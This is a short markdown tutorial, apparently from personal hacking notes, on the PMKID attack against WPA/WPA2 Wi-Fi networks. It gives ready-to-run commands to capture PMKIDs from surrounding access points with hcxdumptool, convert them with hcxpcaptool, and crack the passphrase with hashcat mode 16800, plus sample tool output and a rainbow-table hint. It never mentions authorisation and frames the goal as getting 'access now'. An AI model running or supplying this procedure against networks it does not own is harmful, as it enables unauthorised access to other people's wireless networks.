---
title: PMKID Attack
---

## What is this about?
Saying hello to the AP, getting a specific optional field from that and cracking it...

### Step 0
Read [this](https://en.wikipedia.org/wiki/IEEE_802.11i-2004) like your life depended on it.

### Get the tools
[https://github.com/ZerBea/hcxdumptool](https://github.com/ZerBea/hcxdumptool)

[https://github.com/ZerBea/hcxtools](https://github.com/ZerBea/hcxtools)

Run a *make* and you're all setup!

### Dump the goods

First things first, switch your interface to monitor mode and then lets request the PMKID from surrounding APs and dump that in /tmp/dump.pcap. You can also RTFM for a lot more customization options!
```
./hcxdumptool -o /tmp/dump.pcap -i potato-interface --enable_status=1
```
This will start the process and you'll get something like the following info
```
start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: potato-interface
INTERFACE HARDWARE MAC....: deadbeef1337
DRIVER....................: rtl88XXau
DRIVER VERSION............: 5.6.0
DRIVER FIRMWARE VERSION...: 
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ROGUE (ACCESS POINT)......: 00504785ad5d (BROADCAST HIDDEN)
ROGUE (ACCESS POINT)......: 00504700ad5e (BROADCAST OPEN)
ROGUE (ACCESS POINT)......: 00504785ad5f (incremented on every new client)
ROGUE (CLIENT)............: b0febd79cfaf
EAPOLTIMEOUT..............: 20000 usec
REPLAYCOUNT...............: 65361
ANONCE....................: 90577414bf6b5f7e8c156decd7f54163eb52d8030b4c01ce21e770b3f7fecd0a
SNONCE....................: c8011ea225341264d5d98ba52337a3513a60e518eeea4a0ee30e55c72939e139
```
If an AP around you is vulnerable then the following message will appear, this might take some time so be patient.
```
12:38:04   2 3c8d203ac2e6 001122334455 target [EAPOL:M2M3 EAPOLTIME:3 RC:3 KDV:2]
12:38:04   2 3c8d203ac2e6 001122334455 target [EAPOL:M3M4ZEROED EAPOLTIME:3014 RC:3 KDV:2]
12:39:45   2 3c71bfc2b1c8 001122334455 target [PMKID:<THE SHA1 HASH YOU'RE LOOKING FOR> KDV:2]
```
Which means that the AP with the mac address 001122334455 has sent its pmkid to you!

### Convert and crack
Check the hcxpcaptool options out, this is for hashcat 16800 mode
```
./hcxpcaptool -k /tmp/dump.hash /tmp/dump.pcap
```
Run your hashcat and wait for it ;)
```
hashcat -m 16800 -w 4 -a 3 /tmp/dump.hash mypwnerdictionnary -r mypwnerrules.rule
```
Oh you ain't got all day and need access now? Well go back to the wiki link, re-read it and guess how the PMKID is built? Yep, you might want to check out [hcxkeys](https://github.com/ZerBea/hcxkeys) and get the SSID for the rainbowtables ;)